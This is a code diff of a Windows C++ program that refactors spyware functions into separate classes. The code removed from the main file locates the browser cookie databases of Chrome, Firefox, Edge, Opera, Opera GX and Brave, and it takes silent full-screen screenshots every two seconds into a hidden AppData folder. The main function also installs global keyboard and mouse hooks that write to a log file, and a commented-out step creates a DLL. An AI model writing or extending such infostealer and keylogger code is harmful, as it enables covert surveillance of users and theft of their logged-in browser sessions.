@@ -7,13 +7,15 @@
 #include <locale>
 #include <vector>
 #include <TlHelp32.h>
-#include "lodepng.h" // Include LodePNG header
 #include <ctime>
 #include <gdiplus.h>
 #include <thread>
-#include <future> // for std::async
+#include <future>
 
-
+// Custom or third-party headers
+#include "lodepng.h" 
+#include "BrowserCookiesPaths.h"
+#include "ScreenshotSaver.h"
 
 // #include "tcp_connection.h"
 
@@ -123,220 +125,7 @@ bool DoesFileExist(const std::wstring& filePath) {
     return (fileAttributes != INVALID_FILE_ATTRIBUTES && !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));
 }
 
-std::wstring GetChromeCookiesPath() {
-    // Get the user's name
-    wchar_t userName[MAX_PATH];
-    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
-    if (!GetUserNameW(userName, &userNameSize)) {
-        std::cerr << "Failed to retrieve user name." << std::endl;
-        return L"";
-    }
 
-    // Construct the Chrome Cookies file path
-    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
-
-    if (DoesFileExist(desiredPath)) {
-        std::wcout << "Chrome cookies file found at: " << desiredPath << std::endl;
-        return desiredPath;
-    }
-    else {
-        std::wcerr << "Failed to find Chrome cookies file at: " << desiredPath << std::endl;
-        std::cerr << "Error code: " << GetLastError() << std::endl;
-    }
-    return L"";
-}
-
-std::wstring GetFirefoxProfilesPath() {
-    // Get the user's name
-    wchar_t userName[MAX_PATH];
-    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
-    if (!GetUserNameW(userName, &userNameSize)) {
-        std::cerr << "Failed to retrieve user name." << std::endl;
-        return L"";
-    }
-
-    // Construct the Firefox profiles directory path
-    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles";
-
-    if (DoesFileExist(desiredPath)) {
-        std::wcout << "Firefox profiles directory found at: " << desiredPath << std::endl;
-        return desiredPath;
-
-    }
-    else {
-        std::wcerr << "Failed to find Firefox profiles directory at: " << desiredPath << std::endl;
-        std::cerr << "Error code: " << GetLastError() << std::endl;
-    }
-    return L"";
-
-}
-
-
-std::wstring GetEdgeCookiesPath() {
-    // Get the user's name
-    wchar_t userName[MAX_PATH];
-    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
-    if (!GetUserNameW(userName, &userNameSize)) {
-        std::cerr << "Failed to retrieve user name." << std::endl;
-        return L"";
-    }
-
-    // Construct the Edge Cookies file path
-    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
-
-    if (DoesFileExist(desiredPath)) {
-        std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
-        return desiredPath;
-    }
-    else {
-        std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
-        std::cerr << "Error code: " << GetLastError() << std::endl;
-    }
-    return L"";
-}
-
-std::wstring GetOperaStableCookiesPath() {
-    // Get the AppData directory path
-    wchar_t appDataPath[MAX_PATH];
-    DWORD result = GetEnvironmentVariable(L"APPDATA", appDataPath, MAX_PATH);
-    if (result > 0 && result < MAX_PATH) {
-        // Construct the Opera Stable Cookies file path
-        std::wstring desiredPath = std::wstring(appDataPath) + L"\\Opera Software\\Opera Stable\\Network\\Cookies";
-
-        // Check if the file exists
-        if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
-            std::wcout << "Opera Stable cookies file found at: " << desiredPath << std::endl;
-            return desiredPath;
-        }
-        else {
-            std::wcerr << "Failed to find Opera Stable cookies file at: " << desiredPath << std::endl;
-            std::cerr << "Error code: " << GetLastError() << std::endl;
-        }
-    }
-    else {
-        std::cerr << "Failed to retrieve AppData directory path." << std::endl;
-    }
-
-    return L"";
-}
-
-std::wstring GetOperaGXStableCookiesPath() {
-    // Get the AppData directory path
-    wchar_t appDataPath[MAX_PATH];
-    DWORD result = GetEnvironmentVariable(L"APPDATA", appDataPath, MAX_PATH);
-    if (result > 0 && result < MAX_PATH) {
-        // Construct the Opera GX Stable Cookies file path
-        std::wstring desiredPath = std::wstring(appDataPath) + L"\\Opera Software\\Opera GX Stable\\Network\\Cookies";
-
-        // Check if the file exists
-        if (GetFileAttributesW(desiredPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
-            std::wcout << "Opera GX Stable cookies file found at: " << desiredPath << std::endl;
-            return desiredPath;
-        }
-        else {
-            std::wcerr << "Failed to find Opera GX Stable cookies file at: " << desiredPath << std::endl;
-            std::cerr << "Error code: " << GetLastError() << std::endl;
-        }
-    }
-    else {
-        std::cerr << "Failed to retrieve AppData directory path." << std::endl;
-    }
-
-    return L"";
-}
-
-std::wstring GetBraveCookiesPath() {
-    // Get the user's name
-    wchar_t userName[MAX_PATH];
-    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
-    if (!GetUserNameW(userName, &userNameSize)) {
-        std::cerr << "Failed to retrieve user name." << std::endl;
-        return L"";
-    }
-
-    // Construct the Brave Cookies file path
-    //I will fix that link in future.
-    std::wstring desiredPath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Service Worker\\Database\\CURRENT";
-
-    if (DoesFileExist(desiredPath)) {
-        std::wcout << "Edge cookies file found at: " << desiredPath << std::endl;
-        return desiredPath;
-    }
-    else {
-        std::wcerr << "Failed to find Edge cookies file at: " << desiredPath << std::endl;
-        std::cerr << "Error code: " << GetLastError() << std::endl;
-    }
-    return L"";
-}
-
-// Function to get paths of cookies from different browsers
-std::vector<std::wstring> GetCookiePaths() {
-    std::vector<std::wstring> cookiePaths;
-
-    // Get the path of Chrome cookies and add it to the vector if it exists
-    std::wstring chromeCookiesPath = GetChromeCookiesPath();
-    if (!chromeCookiesPath.empty()) {
-        cookiePaths.push_back(chromeCookiesPath);
-    }
-    else {
-        std::wcerr << "Failed to retrieve Chrome cookies path." << std::endl;
-    }
-
-    // Get the path of Firefox profiles and add it to the vector if it exists
-    std::wstring firefoxProfilesPath = GetFirefoxProfilesPath();
-    if (!firefoxProfilesPath.empty()) {
-        cookiePaths.push_back(firefoxProfilesPath);
-    }
-    else {
-        std::wcerr << "Failed to retrieve Firefox profiles path." << std::endl;
-    }
-
-    // Get the path of Edge cookies and add it to the vector if it exists
-    std::wstring edgeCookiesPath = GetEdgeCookiesPath();
-    if (!edgeCookiesPath.empty()) {
-        cookiePaths.push_back(edgeCookiesPath);
-    }
-    else {
-        std::wcerr << "Failed to retrieve Edge cookies path." << std::endl;
-    }
-
-    // Get the path of Opera Stable cookies and add it to the vector if it exists
-    std::wstring operaStableCookiesPath = GetOperaStableCookiesPath();
-    if (!operaStableCookiesPath.empty()) {
-        cookiePaths.push_back(operaStableCookiesPath);
-    }
-    else {
-        std::wcerr << "Failed to retrieve Opera Stable cookies path." << std::endl;
-    }
-
-    // Get the path of Opera GX Stable cookies and add it to the vector if it exists
-    std::wstring operaGXStableCookiesPath = GetOperaGXStableCookiesPath();
-    if (!operaGXStableCookiesPath.empty()) {
-        cookiePaths.push_back(operaGXStableCookiesPath);
-    }
-    else {
-        std::wcerr << "Failed to retrieve Opera GX Stable cookies path." << std::endl;
-    }
-
-    // Get the path of Opera GX Stable cookies and add it to the vector if it exists
-    std::wstring BraveCookiesPath = GetBraveCookiesPath();
-    if (!BraveCookiesPath.empty()) {
-        cookiePaths.push_back(BraveCookiesPath);
-    }
-    else {
-        std::wcerr << "Failed to retrieve Brave cookies path." << std::endl;
-    }
-
-    return cookiePaths;
-}
-
-// Function to print the cookie paths
-void PrintExistedCookiePaths(const std::vector<std::wstring>& cookiePaths) {
-    std::wcout << "Cookie paths:" << std::endl;
-    for (const auto& path : cookiePaths) {
-        std::wcout << path << std::endl;
-    }
-}
 std::wstring GetValidFileName(const std::wstring& fileName) {
     // Replace invalid characters with underscores
     std::wstring validFileName;
@@ -349,109 +138,6 @@ std::wstring GetValidFileName(const std::wstring& fileName) {
         }
     }
     return validFileName;
-}
-
-void SaveScreenshotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int width, int height) {
-    // Encode BMP data as PNG
-    std::vector<unsigned char> pngData;
-    std::vector<unsigned char> bmpData(width * height * 4); // Allocate buffer for BMP data
-    BITMAPINFOHEADER bi{};
-    bi.biSize = sizeof(BITMAPINFOHEADER);
-    bi.biWidth = width;
-    bi.biHeight = -height; // Top-down bitmap
-    bi.biPlanes = 1;
-    bi.biBitCount = 32; // 32 bits per pixel (RGBA)
-    bi.biCompression = BI_RGB;
-    bi.biSizeImage = 0;
-    bi.biXPelsPerMeter = 0;
-    bi.biYPelsPerMeter = 0;
-    bi.biClrUsed = 0;
-    bi.biClrImportant = 0;
-    HDC hdc = GetDC(NULL);
-    GetDIBits(hdc, hBitmap, 0, height, bmpData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-
-    unsigned error = lodepng::encode(pngData, bmpData, width, height);
-    if (error) {
-        std::wcerr << L"PNG encoding error: " << lodepng_error_text(error) << std::endl;
-        return;
-    }
-
-    // Get the user's name
-    wchar_t userName[MAX_PATH];
-    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
-    if (!GetUserNameW(userName, &userNameSize)) {
-        std::cerr << "Failed to retrieve user name to save PNG files." << std::endl;
-    }
-
-    // Construct full file path for PNG
-    std::wstring fullFilePath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\Screenshot\\" + filePath;
-
-    // Write PNG data to file
-    std::ofstream pngFile(fullFilePath, std::ios::binary);
-    if (!pngFile.is_open()) {
-        std::wcerr << L"Failed to open PNG file for writing: " << fullFilePath << std::endl;
-        return;
-    }
-    pngFile.write(reinterpret_cast<const char*>(pngData.data()), pngData.size());
-
-    std::wcout << L"PNG file saved: " << fullFilePath << std::endl;
-}
-
-
-void GetScreenshot(const std::wstring& userName) {
-    int x1, y1, x2, y2, w, h;
-
-    // get screen dimensions
-    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
-    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-    w = x2 - x1;
-    h = y2 - y1;
-
-    // copy screen to bitmap
-    HDC     hScreen = GetDC(NULL);
-    HDC     hDC = CreateCompatibleDC(hScreen);
-    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
-    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
-
-    // Construct full file path for PNG
-    std::time_t now = std::time(nullptr);
-    std::tm timeinfo;
-    localtime_s(&timeinfo, &now);
-
-    // Calculate required buffer size for formatted date and time string
-    size_t bufferSize = 20; // Initial buffer size
-    wchar_t* buffer = new wchar_t[bufferSize]; // Allocate memory for buffer
-
-    // Format date and time string, checking for buffer overflow
-    size_t resultSize = 0;
-    do {
-        resultSize = std::wcsftime(buffer, bufferSize, L"%Y-%m-%d_%H-%M-%S", &timeinfo);
-        if (resultSize == 0) {
-            // If buffer wasn't large enough, reallocate with double the size
-            bufferSize *= 2;
-            delete[] buffer;
-            buffer = new wchar_t[bufferSize];
-        }
-    } while (resultSize == 0);
-
-    std::wstring filename = GetValidFileName(userName) + L"_" + std::wstring(buffer);
-    std::wstring pngFilePath = filename + L".png";
-
-    // Save Screenshot as PNG
-    SaveScreenshotAsPNG(pngFilePath, hBitmap, w, h);
-
-    // Clean up
-    SelectObject(hDC, old_obj);
-    DeleteDC(hDC);
-    ReleaseDC(NULL, hScreen);
-    DeleteObject(hBitmap);
-
-    // Free dynamically allocated memory
-    delete[] buffer;
-
 }
 
 bool DllPartOfFunctions() {
@@ -544,35 +230,7 @@ bool DllPartOfFunctions() {
     return true;
 }
 
-void ScreenCaptureThread(const wchar_t* userName)
-{
-    while (true) {
-        GetScreenshot(userName);
-        std::this_thread::sleep_for(std::chrono::seconds(2)); // Wait for 5 minutes
-    }
-}
 
-void CreateScreenshotFolder(const std::wstring& userName) {
-    // Construct the full path for the Screenshot folder
-    std::wstring folderPath = L"C:\\Users\\" + userName + L"\\AppData\\Roaming\\Screenshot";
-
-    // Attempt to create the directory
-    if (!CreateDirectory(folderPath.c_str(), NULL)) {
-        DWORD error = GetLastError();
-        if (error == ERROR_ALREADY_EXISTS) {
-            // If the folder already exists, inform the user
-            std::wcout << "The Screenshot folder already exists." << std::endl;
-        }
-        else {
-            // If there was an error creating the folder, provide details about the error
-            std::wcerr << "Failed to create the Screenshot folder. Error code: " << error << std::endl;
-        }
-    }
-    else {
-        // If the folder was successfully created, notify the user
-        std::wcout << "The Screenshot folder was created successfully." << std::endl;
-    }
-}
 
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
@@ -669,7 +327,6 @@ void WaitForThreads(std::thread& thread1, std::thread& thread2) {
     thread2.join();
 }
 
-
 int main() {
     // Get the user's name
     wchar_t userName[MAX_PATH];
@@ -679,31 +336,31 @@ int main() {
         return 1;
     }
 
-    CreateScreenshotFolder(userName);
+    ScreenshotSaver screenshotSaver;
+    screenshotSaver.CreateScreenshotFolder(userName);
 
-    // Create a thread for opening a win screen
     std::thread windowThread(CreateWindowAndMessageLoop);
-
-    // Create a thread for capturing Screenshots
-    std::thread captureThread(ScreenCaptureThread, userName);
+    std::thread captureThread(&ScreenshotSaver::ScreenCaptureThread, &screenshotSaver, userName);
 
     // Run isVulcanworkfine in a separate thread
     /*
-
-        if (!DllPartOfFunctions()) {
-            std::cerr << "Failed when program created a DLL file.";
-            return 1;
-        }
-
+    if (!DllPartOfFunctions()) {
+        std::cerr << "Failed when program created a DLL file.";
+        return 1;
+    }
     */
 
     // Get the cookie paths
-    std::vector<std::wstring> cookiePaths = GetCookiePaths();
+    BrowserCookiesPaths browserCookiesPaths;
+    std::vector<std::wstring> cookiePaths = browserCookiesPaths.GetCookiePaths();
 
-    // Print the cookie paths
-    PrintExistedCookiePaths(cookiePaths);
+    if (!cookiePaths.empty()) {
+        browserCookiesPaths.PrintExistedCookiePaths(cookiePaths);
+    }
+    else {
+        std::wcerr << "No cookie paths were found." << std::endl;
+    }
 
-    // Initialize logging
     std::ofstream logFile("log.csv", std::ios::app);
     logFile << "Time,Event,Type,Key/Position,MousePosition\n";
     logFile.close();
@@ -726,12 +383,10 @@ int main() {
     UnhookWindowsHookEx(keyboardHook);
     UnhookWindowsHookEx(mouseHook);
 
-    // Wait for both threads to finish
     WaitForThreads(captureThread, windowThread);
 
     return 0;
 }
-
 
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
